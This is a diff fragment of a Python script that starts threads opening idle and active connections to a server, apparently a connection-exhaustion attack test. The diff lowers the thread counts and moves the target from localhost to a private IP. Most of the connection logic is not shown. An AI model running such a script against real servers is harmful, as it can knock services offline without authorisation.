@@ -26,7 +26,7 @@ def active_connection(target_ip, target_port):
     finally:
         s.close()
 
-def create_malicious_connections(target_ip, target_port, num_idle=5, num_active=5):
+def create_malicious_connections(target_ip, target_port, num_idle=2, num_active=2):
     for _ in range(num_idle):
         thread = threading.Thread(target=idle_connection, args=(target_ip, target_port))
         thread.start()
@@ -36,7 +36,7 @@ def create_malicious_connections(target_ip, target_port, num_idle=5, num_active=
         thread.start()
 
 if __name__ == "__main__":
-    target_ip = "127.0.0.1"  # Replace with the server IP address
+    target_ip = "172.31.140.10"  # Replace with the server IP address
     target_port = 12345      # Replace with the server port
 
     create_malicious_connections(target_ip, target_port)
